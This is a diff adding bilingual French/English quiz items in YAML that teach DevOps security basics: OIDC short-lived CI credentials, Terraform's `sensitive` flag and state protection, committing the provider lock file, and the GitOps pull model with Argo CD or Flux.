+      fr: "Le jeton OIDC du job est échangé contre des identifiants de courte durée pour un rôle précis ; rien à voler dans les secrets de la CI."
+      en: "The job's OIDC token is exchanged for short-lived credentials on a specific role; nothing to steal from the CI secrets."
+  - q:
+      fr: "Que fait `sensitive = true` sur une variable Terraform ?"
+      en: "What does `sensitive = true` do on a Terraform variable?"
+    options:
+      fr:
+        - "Il masque la valeur dans les sorties de plan et d'apply, mais elle reste en clair dans le state"
+        - "Il chiffre la valeur dans le fichier d'état"
+        - "Il stocke la valeur dans un gestionnaire de secrets"
+        - "Il empêche la variable d'être utilisée dans un module"
+      en:
+        - "It masks the value in plan and apply output, but it stays in clear text in the state"
+        - "It encrypts the value in the state file"
+        - "It stores the value in a secrets manager"
+        - "It prevents the variable from being used in a module"
+    answer: 0
+    why:
+      fr: "`sensitive` n'agit que sur l'affichage. Le state doit donc être protégé (backend chiffré, accès restreint)."
+      en: "`sensitive` only affects display. The state must therefore be protected (encrypted backend, restricted access)."
+  - q:
+      fr: "Quel fichier faut-il commiter pour figer les condensés des providers Terraform ?"
+      en: "Which file must be committed to lock Terraform provider checksums?"
+    options:
+      fr:
+        - "terraform.tfstate"
+        - "terraform.tfvars"
+        - ".terraform.lock.hcl"
+        - "Le dossier .terraform/"
+      en:
+        - "terraform.tfstate"
+        - "terraform.tfvars"
+        - ".terraform.lock.hcl"
+        - "The .terraform/ directory"
+    answer: 2
+    why:
+      fr: "`.terraform.lock.hcl` enregistre les versions et condensés des providers. Le state et le dossier `.terraform/` ne vont jamais dans Git."
+      en: "`.terraform.lock.hcl` records provider versions and checksums. The state and the `.terraform/` directory never go into Git."
+  - q:
+      fr: "Dans un modèle GitOps avec Argo CD ou Flux, qui applique les changements dans le cluster ?"
+      en: "In a GitOps model with Argo CD or Flux, who applies changes to the cluster?"
+    options:
+      fr:
+        - "Le développeur, avec `kubectl apply` depuis son poste"
+        - "Le pipeline de CI, avec un kubeconfig d'administrateur"
+        - "Un agent dans le cluster, qui tire l'état désiré depuis Git"
+        - "Le fournisseur cloud, automatiquement"
+      en:
+        - "The developer, with `kubectl apply` from their laptop"
+        - "The CI pipeline, with a cluster-admin kubeconfig"
+        - "An agent inside the cluster, which pulls the desired state from Git"
+        - "The cloud provider, automatically"
+    answer: 2
+    why:
+      fr: "C'est le modèle « pull » : l'agent réconcilie le cluster avec Git, et la CI n'a plus besoin d'identifiants d'administration du cluster."
+      en: "This is the pull model: the agent reconciles the cluster with Git, and CI no longer needs cluster-admin credentials."
